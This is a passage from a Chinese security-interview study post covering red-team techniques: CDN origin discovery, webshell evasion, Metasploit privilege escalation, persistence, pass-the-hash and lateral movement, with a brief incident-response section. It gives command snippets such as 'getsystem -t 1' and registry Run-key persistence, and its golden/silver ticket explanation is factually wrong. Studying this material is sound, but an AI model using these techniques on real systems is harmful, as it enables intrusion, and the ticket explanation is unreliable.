+<li><strong>利用服务器主动连接</strong>：若目标存在 SSRF 漏洞，构造 payload 让服务器访问自己的公网监控地址（如 <code>http://xxx.xxx.xxx.xxx:port</code>），监控日志中会记录目标的真实 IP；</li>
+<li><strong>边缘节点漏洞</strong>：部分 CDN 配置不当（如未对源站 IP 做访问控制），可通过扫描 CDN 节点的反向代理配置（如 Nginx 的 <code>X-Forwarded-For</code> 泄露源站 IP）。</li>
+<li><strong>ICMP 隧道 / 特殊协议</strong>：部分 CDN 仅加速 HTTP/HTTPS 流量，对 ICMP（ping）、FTP 等协议未代理，可通过 ping 或 FTP 连接尝试获取真实 IP。</li>
+</ol>
+<h3 id="如何手工快速判断目标站是-windows-还是-linux-服务器"><a class="markdownIt-Anchor" href="#如何手工快速判断目标站是-windows-还是-linux-服务器"></a> 如何手工快速判断目标站是 Windows 还是 Linux 服务器？</h3>
+<p>可通过以下差异特征判断：</p>
+<ul>
+<li><strong>文件路径分隔符</strong>：
+<ul>
+<li>Windows 使用反斜杠 <code>\</code>（如 <code>C:\inetpub\wwwroot</code>），Linux 使用正斜杠 <code>/</code>（如 <code>/var/www/html</code>）。若页面报错信息中出现路径，可直接区分。</li>
+</ul>
+</li>
+<li><strong>默认目录与文件</strong>：
+<ul>
+<li>Windows 服务器常见默认路径：<code>/iisstart.htm</code>（IIS 默认页）、<code>/aspnet_client/</code>（<a target="_blank" rel="noopener" href="https://asp.net/">ASP.NET</a> 相关）。</li>
+<li>Linux 服务器常见默认路径：<code>/index.php</code>（PHP 站点）、<code>/robots.txt</code> 权限差异（Linux 对文件权限更敏感）。</li>
+</ul>
+</li>
+<li><strong>大小写敏感性</strong>：
+<ul>
+<li>Linux 系统对文件名 / 路径大小写敏感（如 <code>Index.html</code> 与 <code>index.html</code> 视为不同文件），Windows 不敏感。可通过访问不同大小写的 URL 测试（如 <code>http://目标/Test</code> 与 <code>http://目标/test</code>）。</li>
+</ul>
+</li>
+<li><strong>服务与端口</strong>：
+<ul>
+<li>Windows 常用 IIS 服务器（端口 80/443）、远程桌面（3389）；Linux 常用 Apache/Nginx（80/443）、SSH（22）。若目标开放 22 端口，大概率是 Linux；开放 3389 则大概率是 Windows。</li>
+</ul>
+</li>
+<li><strong>错误信息泄露</strong>：
+<ul>
+<li>IIS 服务器（Windows）报错可能包含 <code>Microsoft-IIS/版本</code> 标识；Apache/Nginx（Linux）报错会显示对应服务器版本（如 <code>Apache/2.4.6</code>）。</li>
+<li>PHP 环境中，<code>phpinfo()</code> 页面的 <code>SERVER_SOFTWARE</code> 字段会显示服务器系统（如 <code>Windows NT</code> 或 <code>Linux</code>）。</li>
+</ul>
+</li>
+</ul>
+<h3 id="蚁剑和冰蝎的区别"><a class="markdownIt-Anchor" href="#蚁剑和冰蝎的区别"></a> 蚁剑和冰蝎的区别?</h3>
+<p>冰蝎的流量进⾏了 aes 加密，相对于蚁剑更加难以被检测， webshell 免杀性好。冰蝎更新了 4.0 更加 安全和易注⼊。</p>
+<h2 id="内网"><a class="markdownIt-Anchor" href="#内网"></a> 内网</h2>
+<h3 id="msf-中-getsystem-无法提权怎么办"><a class="markdownIt-Anchor" href="#msf-中-getsystem-无法提权怎么办"></a> MSF 中 Getsystem 无法提权怎么办？</h3>
+<p>Getsystem 是 Meterpreter 的内置提权命令，失败时可尝试：</p>
+<ul>
+<li><strong>切换提权模块</strong>：使用 MSF 的本地提权模块（如<code>use exploit/windows/local/ms16_075_reflection</code>针对特定漏洞）。</li>
+<li><strong>利用系统配置漏洞</strong>：检查服务权限（如<code>sc query</code>查看服务，若服务可写则替换二进制文件提权）、计划任务（<code>schtasks</code>）、注册表权限。</li>
+<li><strong>尝试不同提权方法</strong>：Getsystem 默认尝试 4 种方法，可手动指定（如<code>getsystem -t 1</code>强制方法 1）。</li>
+<li><strong>迁移进程</strong>：迁移到高权限进程（如<code>ps</code>列出进程，<code>migrate [PID]</code>迁移到 SYSTEM 权限进程）。</li>
+<li><strong>利用第三方工具</strong>：上传提权工具（如 PowerUp、PrivescCheck）到目标，执行后获取提权漏洞。</li>
+</ul>
+<h3 id="msf-中路由的作用是什么"><a class="markdownIt-Anchor" href="#msf-中路由的作用是什么"></a> MSF 中路由的作用是什么？</h3>
+<p>路由用于实现<strong>内网渗透</strong>：当通过一台边界主机（已获取会话）进入内网后，MSF 默认无法直接访问内网其他主机。通过<code>route add</code>添加路由，可将内网网段流量通过已有的会话转发，实现对同网段其他主机的扫描、攻击（如横向移动）。</p>
+<h3 id="什么是-哈希传递攻击其原理是什么"><a class="markdownIt-Anchor" href="#什么是-哈希传递攻击其原理是什么"></a> 什么是 “哈希传递攻击”？其原理是什么？</h3>
+<p><strong>哈希传递攻击（Pass-the-Hash, PtH）</strong> 是一种凭据窃取技术，攻击者通过获取用户的 NTLM 哈希值（而非明文密码），<strong>直接利用该哈希值进行认证，绕过密码验证</strong>。</p>
+<ul>
+<li><strong>原理</strong>：
+<ol>
+<li>攻击者通过漏洞（如 MS17-010）或工具（如 Mimikatz）获取目标系统的 NTLM 哈希；</li>
+<li>使用工具（如 <code>pth-winexe</code>、CrackMapExec）将哈希值注入当前会话；</li>
+<li>系统验证哈希值有效性（无需明文密码），允许攻击者以该用户身份登录。</li>
+</ol>
+</li>
+<li><strong>防御措施</strong>：
+<ul>
+<li>禁用 NTLM 认证，强制使用 Kerberos；</li>
+<li>启用 Windows Defender Credential Guard；</li>
+<li>限制管理员账户的网络访问；</li>
+<li>定期轮换敏感账户密码。</li>
+</ul>
+</li>
+</ul>
+<h3 id="windows-和-linux-系统中常见的持久化控制方法有哪些权限维持"><a class="markdownIt-Anchor" href="#windows-和-linux-系统中常见的持久化控制方法有哪些权限维持"></a> Windows 和 Linux 系统中常见的持久化控制方法有哪些？（权限维持）</h3>
+<p><strong>持久化控制</strong>指攻击者在目标系统植入后门，确保长期访问权限。</p>
+<ul>
+<li><strong>Windows 常见方法</strong>：
+<ul>
+<li><strong>启动项修改</strong>：添加注册表启动项（如 <code>HKCU\Software\Microsoft\Windows\CurrentVersion\Run</code>）；</li>
+<li><strong>计划任务</strong>：创建定时执行的任务（如 <code>schtasks</code>）；</li>
+<li><strong>服务劫持</strong>：修改系统服务的二进制路径；</li>
+<li><strong>WMI 事件订阅</strong>：利用 Windows Management Instrumentation 监听事件并触发执行；</li>
+<li><strong>PowerShell 配置文件</strong>：修改 <code>$PROFILE</code> 脚本实现自动加载。</li>
+</ul>
+</li>
+<li><strong>Linux 常见方法</strong>：
+<ul>
+<li><strong>RC 脚本</strong>：修改 <code>/etc/rc.local</code> 或 <code>/etc/init.d/</code> 下的服务脚本；</li>
+<li><strong>Cron 任务</strong>：添加定时执行的任务（如 <code>crontab -e</code>）；</li>
+<li><strong>SSH 密钥植入</strong>：将公钥添加到 <code>~/.ssh/authorized_keys</code>；</li>
+<li><strong>PAM 模块</strong>：修改 Pluggable Authentication Modules 实现认证绕过；</li>
+<li><strong>内核模块</strong>：加载恶意内核模块（如 LKM Rootkit）。</li>
+</ul>
+</li>
+</ul>
+<h3 id="ms17-010是什么漏洞用了什么协议"><a class="markdownIt-Anchor" href="#ms17-010是什么漏洞用了什么协议"></a> ms17-010是什么漏洞？用了什么协议？</h3>
+<p>445端口、永恒之蓝漏洞、smb协议</p>
+<h3 id="黄金票据和白银票据了解吗可以讲下吗"><a class="markdownIt-Anchor" href="#黄金票据和白银票据了解吗可以讲下吗"></a> 黄金票据和白银票据了解吗，可以讲下吗？</h3>
+<p><strong>黄金票据：</strong><br />
+也称为“<strong>域管理员组帐户</strong>”，拥有黄金票据的用户<strong>可以访问域中所有计算机的本地管理员帐户</strong>，<strong>能够创建新的域管理员和更改现有的域管理员帐户密码</strong><br />
+<strong>白银票据：</strong><br />
+通常属于<strong>本地管理员帐户</strong>，只能访问本地计算机并执行特定任务。<strong>无法访问其他计算机或管理其他本地管理员帐户</strong><br />
+<strong>区别：</strong><br />
+<strong>黄金票据通常指一个</strong>具有域管理员权限的票据**，而白银票据通常指**普通用户的票据</p>
+<h3 id="可以讲下利用黄金票据前提条件吗"><a class="markdownIt-Anchor" href="#可以讲下利用黄金票据前提条件吗"></a> <strong>可以讲下利用黄金票据前提条件吗？</strong></h3>
+<ul>
+<li>域名称</li>
+<li>域的SID值</li>
+<li>域的KRBTGT账户的 Hash NTLM值</li>
+<li>伪造用户名，可以是任意用户甚至是不存在的用户</li>
+</ul>
+<h3 id="内网横向有哪些思路"><a class="markdownIt-Anchor" href="#内网横向有哪些思路"></a> 内网横向有哪些思路</h3>
+<p><strong><code>IPC$</code>横向</strong>：对方开启<code>IPC$ </code>文件共享并得到用户账号密码后使用 IPC 建立连接，获取权限</p>
+<p><strong>WMI横向</strong>：使用 <code>wmic</code> 远程执行命令，在远程系统中启动 <code>Windows Mannagement Instrumentation</code> 服务（目标服务器需要开放 135 端口，wmic 会以管理员权限在远程系统中执行命令）</p>
+<p><strong>smb 横向</strong>：获取对方的用户凭据后(用户名和密码哈希)，<strong>通过SMB协议向网络中的其他机器发起认证，并在认证成功后执行远程操作</strong></p>
+<p><strong>WinRM横向</strong>：利用已获取的合法用户凭据(用户名和明文密码)，通过 <strong>Windows远程管理服务</strong>，在远程Windows主机上执行命令或获取交互式Shell</p>
+<p><strong>PTH - 哈希传递</strong>:获取用户的用户名和密码哈希后，<strong>可以直接作为认证凭证使用，无需破解出明文密码</strong></p>
+<p><strong>PTK-密钥传递</strong>：<strong>在Kerberos认证中，用户的加密密钥可以直接用于获取Kerberos票据，无需密码或哈希，从而完成身份认证</strong></p>
+<p><strong>PTT - 票据传递</strong>：<strong>直接窃取或伪造有效的Kerberos票据，并将其注入到当前会话中，以此冒充合法用户访问网络资源，无需密码、哈希或密钥</strong></p>
+<p><strong>RDP横向</strong>：获取用户名和明文密码后，直接通过远程桌面服务连接对方主机</p>
+<p>委派攻击：</p>
+<ul>
+<li>非约束委派(Unconstrained Delegation, UD)</li>
+<li>约束委派(Constrained Delegation, CD)</li>
+<li>基于资源的约束委派(Resource Based Constrained Delegation, RBCD)</li>
+</ul>
+<h3 id="windows提权技术"><a class="markdownIt-Anchor" href="#windows提权技术"></a> Windows提权技术</h3>
+<p>系统内核溢出漏洞(先通过msf的漏洞筛选模块，筛选一下可能存在的内核漏洞)</p>
+<p>数据库提权</p>
+<p>AT本地命令提权(定时任务，高版本已无)</p>
+<p>SC本地命令提权</p>
+<p>PS提权(psexec.exe)</p>
+<h3 id="linux提权技术"><a class="markdownIt-Anchor" href="#linux提权技术"></a> Linux提权技术</h3>
+<p>内核漏洞</p>
+<p>SUID</p>
+<p>SUDO</p>
+<p>Cron计划任务</p>
+<p>环境变量劫持提权(和LD劫持一样)</p>
+<p>数据库提权</p>
+<h3 id="内网信息收集工具"><a class="markdownIt-Anchor" href="#内网信息收集工具"></a> 内网信息收集工具</h3>
+<p>fscan</p>
+<p>nmap</p>
+<p>mimikatz</p>
+<p>Bloodhound</p>
+<p>SharpDecryptPwd</p>
+<p>Adfind</p>
+<h2 id="蓝队"><a class="markdownIt-Anchor" href="#蓝队"></a> 蓝队</h2>
+<h3 id="应急响应基本思路"><a class="markdownIt-Anchor" href="#应急响应基本思路"></a> 应急响应基本思路</h3>
+<p><strong>应急响应具体步骤：</strong><br />
+（1）<strong>首先检测有没有</strong>可疑的账号</p>
+<p>（2）<strong>history指令查看</strong>历史命令</p>
+<p>（3）<strong>检查</strong>异常端口和进程**，**netstat检查异常端口，ps检查异常进程</p>
+<p>（4）查看一些系统日志以及常见的<strong>web安全日志</strong></p>
+<p>（5）然后利用查杀工具，比如D盾</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E9%9D%A2%E7%BB%8F/" rel="tag">面经</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+      <div class="article-nav-link-wrap article-nav-link-left">
+        
+          
+          
+            <img data-src="/images/1755142834147175514283467.jpg" data-sizes="auto" alt="Windows环境Redis未授权访问漏洞利用" class="lazyload">
+          
+        
+        <a href="/2026/01/15/Windows%E7%8E%AF%E5%A2%83Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+          
+            Windows环境Redis未授权访问漏洞利用
+          
+        </h3>
+      </div>
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="/images/17373827994914.jpg" data-sizes="auto" alt="陇原战疫-php反序列化到ssrf打fpm" class="lazyload">
+        
+      
+      <a href="/2026/01/05/%E9%99%87%E5%8E%9F%E6%88%98%E7%96%AB-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%B0ssrf%E6%89%93fpm/"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          陇原战疫-php反序列化到ssrf打fpm
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+</section>
+        </div>
+        
+        
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      2020-2026
+      <span class="footer-info-sep rotate"></span>
+      FuB0Y
+    </div>
+    
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        1227.1k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        97:36
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web"><span class="toc-number">1.</span> <span class="toc-text"> Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.</span> <span class="toc-text"> SQL注入原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#udf%E6%8F%90%E6%9D%83%E5%8E%9F%E7%90%86"><span class="toc-number">1.2.</span> <span class="toc-text"> UDF提权原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mof%E6%8F%90%E6%9D%83"><span class="toc-number">1.3.</span> <span class="toc-text"> MOF提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mysql%E5%86%99shell%E5%A6%82%E6%9E%9C%E4%B8%8D%E7%9F%A5%E9%81%93%E7%BD%91%E7%AB%99%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84%E6%88%91%E4%BB%AC%E9%80%9A%E8%BF%87%E4%BB%80%E4%B9%88%E6%96%B9%E5%BC%8F%E5%8F%AF%E4%BB%A5%E7%9F%A5%E9%81%93%E7%BD%91%E7%AB%99%E8%B7%AF-%E5%BE%84"><span class="toc-number">1.4.</span> <span class="toc-text"> mysql写shell，如果不知道⽹站绝对路径，我们通过什么⽅式可以知道⽹站路 径</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E5%88%A4%E6%96%AD%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8B%E7%9A%84%E8%AF%AD%E5%8F%A5%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">1.5.</span> <span class="toc-text"> SQL注⼊判断数据库类型的语句是什么？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mysql-%E7%9A%84%E7%BD%91%E7%AB%99%E6%B3%A8%E5%85%A550-%E4%BB%A5%E4%B8%8A%E5%92%8C-50-%E4%BB%A5%E4%B8%8B%E6%9C%89%E4%BB%80%E4%B9%88%E5%8C%BA%E5%88%AB"><span class="toc-number">1.6.</span> <span class="toc-text"> MySQL 的网站注入，5.0 以上和 5.0 以下有什么区别？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sql-%E6%B3%A8%E5%85%A5%E8%BF%87%E6%BB%A4%E4%BA%86%E9%80%97%E5%8F%B7%E6%80%8E%E4%B9%88%E5%A4%84%E7%90%86"><span class="toc-number">1.7.</span> <span class="toc-text"> SQL 注入过滤了逗号，怎么处理？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sql-%E6%B3%A8%E5%85%A5%E5%AD%98%E5%9C%A8%E6%97%B6%E6%80%8E%E4%B9%88%E5%88%A4%E6%96%AD%E6%98%AF%E4%BB%80%E4%B9%88%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">1.8.</span> <span class="toc-text"> SQL 注入存在时，怎么判断是什么数据库？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8E%9F%E7%90%86%E7%BB%95%E8%BF%87"><span class="toc-number">1.9.</span> <span class="toc-text"> 文件上传原理&#x2F;绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#htaccess"><span class="toc-number">1.9.1.</span> <span class="toc-text"> .htaccess</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#userini"><span class="toc-number">1.9.2.</span> <span class="toc-text"> .user.ini</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ssrf%E5%92%8Ccsrf%E5%92%8Cxss%E7%9A%84%E5%8E%9F%E7%90%86%E5%92%8C%E5%8C%BA%E5%88%AB"><span class="toc-number">1.10.</span> <span class="toc-text"> ssrf和csrf和xss的原理和区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ssrf%E5%92%8Ccsrf%E5%92%8Cxss%E7%9A%84%E9%98%B2%E5%BE%A1%E6%96%B9%E6%B3%95"><span class="toc-number">1.11.</span> <span class="toc-text"> ssrf和csrf和xss的防御方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ssrf%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">1.12.</span> <span class="toc-text"> ssrf的利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ssrf%E4%B8%80%E8%88%AC%E5%B8%B8%E7%94%A8%E7%9A%84%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%9C%89%E5%93%AA%E4%BA%9B"><span class="toc-number">1.13.</span> <span class="toc-text"> ssrf⼀般常⽤的伪协议有哪些？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ssrf-%E7%A6%81%E7%94%A8-127001-%E5%90%8E%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87%E6%94%AF%E6%8C%81%E5%93%AA%E4%BA%9B%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.14.</span> <span class="toc-text"> SSRF 禁⽤ 127.0.0.1 后如何绕过，⽀持哪些协议？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#csrf-%E6%BC%8F%E6%B4%9E%E5%A6%82%E4%BD%95%E9%98%B2%E6%8A%A4"><span class="toc-number">1.15.</span> <span class="toc-text"> CSRF 漏洞如何防护</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#redis%E6%9C%AA%E6%8E%88%E6%9D%83%E5%88%A9%E7%94%A8redis%E6%8F%90%E6%9D%83%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">1.16.</span> <span class="toc-text"> Redis未授权利用&#x2F;redis提权利用方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#redis%E6%9C%AA%E6%8E%88%E6%9D%83%E7%9A%84%E9%98%B2%E6%8A%A4"><span class="toc-number">1.17.</span> <span class="toc-text"> Redis未授权的防护</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E5%8E%9F%E7%90%86"><span class="toc-number">1.18.</span> <span class="toc-text"> Redis主从复制原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xss"><span class="toc-number">1.19.</span> <span class="toc-text"> XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xxe%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.20.</span> <span class="toc-text"> XXE漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#crlf%E4%BA%86%E8%A7%A3%E5%90%97-%E6%80%8E%E4%B9%88%E7%BB%95%E8%BF%87"><span class="toc-number">1.21.</span> <span class="toc-text"> crlf了解吗、怎么绕过？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5"><span class="toc-number">1.22.</span> <span class="toc-text"> 同源策略</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.23.</span> <span class="toc-text"> web中间件常见漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E7%9A%84%E4%B8%AD%E9%97%B4%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E6%9C%89%E5%93%AA%E4%BA%9B"><span class="toc-number">1.24.</span> <span class="toc-text"> 常⻅的中间件解析漏洞有哪些</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E7%9A%84%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.25.</span> <span class="toc-text"> 常见的逻辑漏洞的类型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86%E7%BB%95%E8%BF%87"><span class="toc-number">1.26.</span> <span class="toc-text"> pickle反序列化原理&#x2F;绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86"><span class="toc-number">1.27.</span> <span class="toc-text"> php反序列化原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%B4%E5%87%A0%E4%B8%AAphp%E9%87%8C%E9%9D%A2%E5%8F%AF%E4%BB%A5%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-number">1.28.</span> <span class="toc-text"> 说⼏个php⾥⾯可以执⾏命令的函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B8%B8%E7%94%A8%E5%8E%9F%E7%94%9F%E7%B1%BB"><span class="toc-number">1.29.</span> <span class="toc-text"> php反序列化常用原生类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#thinkphp%E6%BC%8F%E6%B4%9E%E7%90%86%E8%A7%A3"><span class="toc-number">1.30.</span> <span class="toc-text"> Thinkphp漏洞理解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rce%E8%BF%87%E6%BB%A4%E7%89%B9%E5%AE%9A%E5%AD%97%E7%AC%A6%E4%BE%8B%E5%A6%82flag%E8%AF%A5%E6%80%8E%E4%B9%88%E5%8A%9E"><span class="toc-number">1.31.</span> <span class="toc-text"> rce过滤特定字符，例如flag该怎么办？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">1.32.</span> <span class="toc-text"> JS原型链污染漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jwt%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.33.</span> <span class="toc-text"> JWT漏洞利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ld_preload%E5%8A%AB%E6%8C%81"><span class="toc-number">1.34.</span> <span class="toc-text"> LD_PRELOAD劫持</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#disable_functions%E7%BB%95%E8%BF%87"><span class="toc-number">1.35.</span> <span class="toc-text"> disable_functions绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#open_basedir%E7%BB%95%E8%BF%87"><span class="toc-number">1.36.</span> <span class="toc-text"> open_basedir绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.37.</span> <span class="toc-text"> Session文件包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E9%98%B2%E5%BE%A1"><span class="toc-number">1.38.</span> <span class="toc-text"> 文件包含防御</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B7%A8%E5%9F%9Fjsonp-%E4%B8%8E-cors-%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">1.39.</span> <span class="toc-text"> 跨域；Jsonp 与 Cors 是什么？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%E4%B8%AD%E7%9A%84%E5%90%8C%E6%BA%90%E6%9D%A1%E4%BB%B6%E4%BD%9C%E7%94%A8%E4%B8%8E%E9%99%90%E5%88%B6"><span class="toc-number">1.40.</span> <span class="toc-text"> 同源策略中的同源条件；作用与限制？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#javasec"><span class="toc-number">2.</span> <span class="toc-text"> Javasec</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#java%E5%8F%8D%E5%B0%84%E5%8E%9F%E7%90%86"><span class="toc-number">2.1.</span> <span class="toc-text"> java反射原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#java%E7%9A%84%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE%E6%9C%BA%E5%88%B6"><span class="toc-number">2.2.</span> <span class="toc-text"> java的双亲委派机制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#java%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD"><span class="toc-number">2.3.</span> <span class="toc-text"> java类的动态加载</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jdk%E9%AB%98%E7%89%88%E6%9C%AC%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87"><span class="toc-number">2.4.</span> <span class="toc-text"> JDK高版本限制&amp;绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E5%86%B3jackson%E9%93%BE%E7%9A%84%E4%B8%8D%E7%A8%B3%E5%AE%9A%E6%80%A7"><span class="toc-number">2.5.</span> <span class="toc-text"> 解决jackson链的不稳定性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jndi%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E9%AB%98%E7%89%88%E6%9C%ACjdk"><span class="toc-number">2.6.</span> <span class="toc-text"> JNDI注入绕过高版本JDK</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%96%B9%E5%BC%8F"><span class="toc-number">2.7.</span> <span class="toc-text"> java命令执行方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E4%BC%A0%E7%BB%9F%E5%8F%8D%E5%B0%84%E9%BB%91%E5%90%8D%E5%8D%95"><span class="toc-number">2.8.</span> <span class="toc-text"> 绕过传统反射黑名单</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jndi%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86"><span class="toc-number">2.9.</span> <span class="toc-text"> JNDI注入原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rmi%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B"><span class="toc-number">2.10.</span> <span class="toc-text"> RMI工作流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rmi-jndi-%E7%9A%84%E5%8E%9F%E7%90%86%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">2.11.</span> <span class="toc-text"> RMI-JNDI 的原理是什么？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" 